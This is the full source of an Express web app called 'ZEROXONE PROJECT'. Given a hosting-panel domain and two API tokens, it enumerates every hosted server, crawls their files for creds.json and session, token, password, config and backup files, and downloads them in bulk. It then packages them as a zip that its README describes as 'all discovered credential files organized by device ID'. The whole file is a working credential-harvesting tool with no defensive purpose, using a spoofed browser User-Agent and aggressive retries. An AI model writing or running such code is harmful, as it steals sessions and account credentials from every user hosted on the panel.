const express = require('express');
const axios = require('axios');
const archiver = require('archiver');

const app = express();

app.use(express.json());
app.use(express.static('public'));

const scanStorage = new Map();
const fileStorage = new Map();

function createScanner(domain, plta, pltc, opts = {}) {
  const state = {
    domain: String(domain || '').replace(/\/+$/, ''),
    plta: String(plta || ''),
    pltc: String(pltc || ''),
    foundFiles: [],
    scanStats: { serversScanned: 0, filesFound: 0, errors: 0 },
    concurrency: Number(opts.concurrency || 10),
    retryLimit: Number(opts.retryLimit || 5),
    retryDelayBase: Number(opts.retryDelayBase || 1000),
    dryRun: Boolean(opts.dryRun || false),
    scanId: opts.scanId,
    timeout: Number(opts.timeout || 30000)
  };

  const dirs = ['session', 'sessions', 'sesion', 'sesi', 'sessi'];
  const targets = ['creds.json'];
  const deviceRegex = /device\d{4,}|user\d{4,}|account\d{4,}|session\d{4,}|auth\d{4,}/i;

  function buildAxiosInstance(token) {
    return axios.create({
      baseURL: state.domain,
      headers: {
        'Accept': 'application/json',
        'Authorization': `Bearer ${token}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      timeout: state.timeout
    });
  }

  async function requestWithRetry(instance, url, config = {}, attempt = 0) {
    try {
      const response = await instance.get(url, config);
      return response;
    } catch (error) {
      if (attempt >= state.retryLimit) throw error;
      const delay = state.retryDelayBase * Math.pow(2, attempt);
      await new Promise(resolve => setTimeout(resolve, delay + Math.random() * 1000));
      return requestWithRetry(instance, url, config, attempt + 1);
    }
  }

  async function listFiles(identifier, directory = '/') {
    if (!identifier) return [];
    const instance = buildAxiosInstance(state.pltc);
    try {
      const response = await requestWithRetry(instance, `/api/application/servers/${identifier}/files/list`, {
        params: { 
          directory,
          _: Date.now()
        },
        timeout: state.timeout
      });
      return Array.isArray(response.data?.data) ? response.data.data : [];
    } catch (error) {
      state.scanStats.errors++;
      return [];
    }
  }

  async function scanDirectory(identifier, dir = '/', depth = 0) {
    if (depth > 10) return;
    
    const queue = [{ id: identifier, dir, depth }];
    
    while (queue.length > 0) {
      const batch = queue.splice(0, state.concurrency);
      const promises = batch.map(async (task) => {
        try {
          const files = await listFiles(task.id, task.dir);
          
          for (const item of files) {
            const name = item.attributes?.name || item.name || '';
            if (!name || name.startsWith('.')) continue;
            
            const itemPath = (task.dir === '/' ? '' : task.dir) + '/' + name;
            const normalized = itemPath.replace(/\/+/g, '/').replace(/^\//, '');
            
            const mime = item.attributes?.mime || item.attributes?.type || item.type || '';
            let isDirectory = mime === 'inode/directory' || mime === 'dir' || mime === 'directory';
            
            if (!isDirectory && dirs.includes(name.toLowerCase())) {
              try {
                const testFiles = await listFiles(task.id, normalized);
                if (Array.isArray(testFiles) && testFiles.length > 0) {
                  isDirectory = true;
                }
              } catch (testError) {}
            }
            
            if (!isDirectory) {
              const lowerName = name.toLowerCase();
              const isTargetFile = targets.some(target => lowerName.includes(target));
              const isSuspiciousFile = /(credential|password|token|auth|session|config|backup)\.(json|txt|db|sql|xml)/i.test(name);
              
              if (isTargetFile || isSuspiciousFile) {
                state.foundFiles.push({
                  path: normalized,
                  name: name,
                  server: task.id,
                  size: item.attributes?.size || 0,
                  modified: item.attributes?.modified_at || null,
                  type: 'file'
                });
                state.scanStats.filesFound++;
              }
              continue;
            }
            
            const pathParts = normalized.split('/');
            const matchedDevice = pathParts.find(part => deviceRegex.test(part));
            
            if (matchedDevice) {
              const potentialFiles = ['creds.json', 'auth.json', 'session.json', 'config.json', 'data.json'];
              
              for (const potentialFile of potentialFiles) {
                const potentialPath = normalized.replace(/\/+$/, '') + '/' + potentialFile;
                state.foundFiles.push({
                  path: potentialPath,
                  name: potentialFile,
                  server: task.id,
                  size: 0,
                  matchedDevice: matchedDevice,
                  type: 'potential'
                });
                state.scanStats.filesFound++;
              }
              
              if (task.depth < 3) {
                queue.push({ 
                  id: task.id, 
                  dir: normalized, 
                  depth: task.depth + 1 
                });
              }
              continue;
            }
            
            if (task.depth < 5) {
              queue.push({ 
                id: task.id, 
                dir: normalized, 
                depth: task.depth + 1 
              });
            }
          }
        } catch (error) {
          state.scanStats.errors++;
        }
      });
      
      await Promise.allSettled(promises);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  async function getFileContent(identifier, filePath) {
    if (!identifier || !filePath) return null;
    
    const instance = buildAxiosInstance(state.pltc);
    try {
      const downloadResponse = await requestWithRetry(instance, `/api/application/servers/${identifier}/files/download`, {
        params: { 
          file: filePath,
          _: Date.now()
        },
        timeout: state.timeout
      });
      
      const downloadUrl = downloadResponse.data?.attributes?.url;
      if (!downloadUrl) return null;
      
      if (state.dryRun) {
        return { dryRun: true, url: downloadUrl, path: filePath };
      }
      
      const fileResponse = await axios.get(downloadUrl, {
        responseType: 'arraybuffer',
        timeout: state.timeout,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });
      
      const bufferData = Buffer.from(fileResponse.data);
      
      try {
        const jsonData = JSON.parse(bufferData.toString());
        return {
          content: jsonData,
          raw: bufferData.toString(),
          size: bufferData.length,
          type: 'json'
        };
      } catch (parseError) {
        return {
          content: bufferData.toString('utf8'),
          raw: bufferData.toString(),
          size: bufferData.length,
          type: 'text'
        };
      }
    } catch (error) {
      state.scanStats.errors++;
      return null;
    }
  }

  async function fetchAllServers() {
    if (!state.plta) return [];
    
    const instance = buildAxiosInstance(state.plta);
    let currentPage = 1;
    const allServers = [];
    
    while (true) {
      try {
        const response = await requestWithRetry(instance, `/api/application/servers`, {
          params: { 
            page: currentPage,
            per_page: 100,
            _: Date.now()
          },
          timeout: state.timeout
        });
        
        const serversData = response.data?.data;
        if (!Array.isArray(serversData) || serversData.length === 0) break;
        
        allServers.push(...serversData);
        
        const paginationInfo = response.data?.meta?.pagination;
        const totalPages = paginationInfo?.total_pages || 0;
        
        if (!paginationInfo || currentPage >= totalPages) break;
        currentPage++;
        
        await new Promise(resolve => setTimeout(resolve, 200));
      } catch (error) {
        state.scanStats.errors++;
        break;
      }
    }
    
    return allServers;
  }

  async function scanAllServers() {
    try {
      if (!state.plta || !state.pltc) {
        return { 
          success: false, 
          error: 'missing_tokens', 
          stats: state.scanStats 
        };
      }
      
      state.foundFiles = [];
      state.scanStats = { serversScanned: 0, filesFound: 0, errors: 0 };
      
      const serversList = await fetchAllServers();
      state.scanStats.serversScanned = serversList.length;
      
      let processedServers = 0;
      const serverBatchSize = Math.min(state.concurrency, 5);
      
      for (let i = 0; i < serversList.length; i += serverBatchSize) {
        const batch = serversList.slice(i, i + serverBatchSize);
        const batchPromises = batch.map(async (server) => {
          const serverId = server.attributes?.identifier || server.identifier || server.id;
          try {
            await scanDirectory(serverId, '/', 0);
          } catch (error) {
            state.scanStats.errors++;
          }
          processedServers++;
        });
        
        await Promise.allSettled(batchPromises);
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      
      if (state.dryRun) {
        return {
          success: true,
          stats: state.scanStats,
          totalFound: state.foundFiles.length,
          results: state.foundFiles
        };
      }
      
      const finalResults = [];
      let processedFiles = 0;
      const fileBatchSize = Math.min(state.concurrency, 3);
      
      for (let i = 0; i < state.foundFiles.length; i += fileBatchSize) {
        const batch = state.foundFiles.slice(i, i + fileBatchSize);
        const batchPromises = batch.map(async (file) => {
          try {
            const fileContent = await getFileContent(file.server, file.path);
            if (!fileContent) return null;
            
            let deviceIdentifier = null;
            
            if (file.matchedDevice) {
              deviceIdentifier = file.matchedDevice;
            } else if (fileContent.content && typeof fileContent.content === 'object') {
              const content = fileContent.content;
              const possibleIds = [
                content.me?.id,
                content.user?.id,
                content.account?.id,
                content.device?.id,
                content.session?.id,
                content.id
              ];
              
              for (const idValue of possibleIds) {
                if (idValue && typeof idValue === 'string') {
                  const idMatch = idValue.match(/\d{6,}/);
                  if (idMatch) {
                    deviceIdentifier = idMatch[0];
                    break;
                  }
                }
              }
            }
            
            if (!deviceIdentifier) {
              const pathMatch = file.path.match(/\d{6,}/);
              deviceIdentifier = pathMatch ? pathMatch[0] : Math.random().toString(36).slice(2, 10).toUpperCase();
            }
            
            const fileKey = `DEVICE_${deviceIdentifier}_${file.name}`;
            const fileData = {
              server: file.server,
              path: file.path,
              saved_path: fileKey,
              device_id: deviceIdentifier,
              content: fileContent.content || fileContent.raw,
              raw_content: fileContent.raw,
              content_type: fileContent.type,
              file_size: fileContent.size || 0,
              scan_timestamp: new Date().toISOString(),
              file_type: file.type
            };
            
            finalResults.push(fileData);
            processedFiles++;
          } catch (error) {
            state.scanStats.errors++;
            return null;
          }
        });
        
        const batchResults = await Promise.allSettled(batchPromises);
        const validResults = batchResults
          .filter(result => result.status === 'fulfilled' && result.value)
          .map(result => result.value);
        
        finalResults.push(...validResults);
        await new Promise(resolve => setTimeout(resolve, 300));
      }
      
      return {
        success: true,
        stats: state.scanStats,
        totalFound: state.foundFiles.length,
        results: finalResults,
        scan_id: state.scanId,
        timestamp: new Date().toISOString()
      };
      
    } catch (error) {
      return {
        success: false,
        error: error.message,
        stats: state.scanStats,
        timestamp: new Date().toISOString()
      };
    }
  }

  return {
    scanAllServers,
    getStats: () => state.scanStats
  };
}

app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>ZEROXONE PROJECT</title>
    <meta http-equiv="refresh" content="0; url=/scanner">
</head>
<body>
    <script>window.location.href = '/scanner';</script>
</body>
</html>
  `);
});

app.get('/scanner', (req, res) => {
  res.sendFile(require('path').join(__dirname, '../public/index.html'));
});

app.post('/api/scan', async (req, res) => {
  try {
    const { domain, plta, pltc, mode = 'aggressive', concurrency = 10 } = req.body;
    
    if (!domain || !plta || !pltc) {
      return res.status(400).json({
        success: false,
        error: 'missing_parameters',
        message: 'Domain, PLTA, and PLTC tokens are required'
      });
    }
    
    const scanIdentifier = `scan_${Date.now()}_${Math.random().toString(36).slice(2)}`;
    
    const scannerOptions = {
      concurrency: parseInt(concurrency) || 10,
      retryLimit: 5,
      retryDelayBase: 1000,
      timeout: 45000,
      dryRun: false,
      scanId: scanIdentifier
    };
    
    const scannerInstance = createScanner(domain, plta, pltc, scannerOptions);
    
    const scanResult = await scannerInstance.scanAllServers();
    
    if (scanResult.success && scanResult.results) {
      scanStorage.set(scanIdentifier, scanResult);
      
      scanResult.results.forEach(file => {
        if (file.content || file.raw_content) {
          const storageKey = `${scanIdentifier}_${file.saved_path}`;
          fileStorage.set(storageKey, {
            content: file.content,
            raw_content: file.raw_content,
            metadata: {
              server: file.server,
              path: file.path,
              device_id: file.device_id,
              content_type: file.content_type,
              file_size: file.file_size,
              scan_timestamp: file.scan_timestamp
            }
          });
        }
      });
      
      scanResult.download_url = `/api/download/${scanIdentifier}`;
      scanResult.report_url = `/api/report/${scanIdentifier}`;
    }
    
    res.json(scanResult);
    
  } catch (error) {
    console.error('Scan API Error:', error);
    res.status(500).json({
      success: false,
      error: 'internal_error',
      message: error.message
    });
  }
});

app.get('/api/download/:scanId', async (req, res) => {
  try {
    const scanId = req.params.scanId;
    const scanData = scanStorage.get(scanId);
    
    if (!scanData) {
      return res.status(404).json({
        success: false,
        error: 'scan_not_found'
      });
    }
    
    const archive = archiver('zip', {
      zlib: { level: 9 }
    });
    
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename="zeroxone_scan_${scanId}.zip"`);
    
    archive.pipe(res);
    
    if (scanData.results) {
      for (const file of scanData.results) {
        const storageKey = `${scanId}_${file.saved_path}`;
        const storedFile = fileStorage.get(storageKey);
        
        if (storedFile) {
          const fileContent = storedFile.content || storedFile.raw_content;
          const fileName = `data/${file.device_id}/${file.saved_path}`;
          
          if (typeof fileContent === 'object') {
            archive.append(JSON.stringify(fileContent, null, 2), { name: fileName });
          } else {
            archive.append(String(fileContent), { name: fileName });
          }
        }
      }
    }
    
    const reportData = {
      project: 'ZEROXONE PROJECT',
      scan_id: scanId,
      timestamp: scanData.timestamp,
      statistics: scanData.stats,
      summary: {
        total_servers: scanData.stats?.serversScanned || 0,
        total_files: scanData.totalFound || 0,
        total_errors: scanData.stats?.errors || 0,
        success_rate: scanData.stats?.serversScanned > 0 ? 
          ((scanData.stats.serversScanned - scanData.stats.errors) / scanData.stats.serversScanned * 100).toFixed(2) + '%' : '0%'
      },
      configuration: {
        concurrency: 10,
        mode: 'aggressive',
        version: '3.0.0'
      }
    };
    
    archive.append(JSON.stringify(reportData, null, 2), { name: 'SCAN_REPORT.json' });
    
    const readmeContent = `
ZEROXONE PROJECT - SCAN RESULTS
================================

Scan ID: ${scanId}
Timestamp: ${scanData.timestamp}
Total Servers: ${scanData.stats?.serversScanned || 0}
Total Files Found: ${scanData.totalFound || 0}

This archive contains all discovered credential files organized by device ID.

PROJECT: ZEROXONE PROJECT
VERSION: 3.0.0
    `;
    
    archive.append(readmeContent, { name: 'README.txt' });
    
    await archive.finalize();
    
  } catch (error) {
    console.error('Download Error:', error);
    res.status(500).json({
      success: false,
      error: 'download_failed',
      message: error.message
    });
  }
});

app.get('/api/report/:scanId', async (req, res) => {
  try {
    const scanId = req.params.scanId;
    const scanData = scanStorage.get(scanId);
    
    if (!scanData) {
      return res.status(404).json({
        success: false,
        error: 'scan_not_found'
      });
    }
    
    const report = {
      project: 'ZEROXONE PROJECT',
      scan_id: scanId,
      timestamp: scanData.timestamp,
      status: scanData.success ? 'completed' : 'failed',
      statistics: scanData.stats,
      files_found: scanData.totalFound || 0,
      results: scanData.results ? scanData.results.map(item => ({
        device_id: item.device_id,
        server: item.server,
        file_path: item.path,
        file_type: item.file_type,
        content_type: item.content_type,
        file_size: item.file_size
      })) : [],
      download_url: `/api/download/${scanId}`
    };
    
    res.json(report);
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'report_generation_failed'
    });
  }
});

app.get('/api/status', (req, res) => {
  res.json({
    project: 'ZEROXONE PROJECT',
    status: 'operational',
    version: '3.0.0',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'production',
    memory_usage: process.memoryUsage(),
    uptime: process.uptime()
  });
});

setInterval(() => {
  const currentTime = Date.now();
  const maxAge = 60 * 60 * 1000;
  
  for (const [scanId, scanData] of scanStorage.entries()) {
    const scanTime = parseInt(scanId.split('_')[1]);
    if (currentTime - scanTime > maxAge) {
      scanStorage.delete(scanId);
      
      for (const key of fileStorage.keys()) {
        if (key.startsWith(scanId)) {
          fileStorage.delete(key);
        }
      }
    }
  }
}, 30 * 60 * 1000);

const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;

if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`🚀 ZEROXONE PROJECT running on port ${PORT}`);
    console.log(`📊 Scanner API: http://localhost:${PORT}/scanner`);
    console.log(`🛠️  Status: http://localhost:${PORT}/api/status`);
  });
}

module.exports = app;
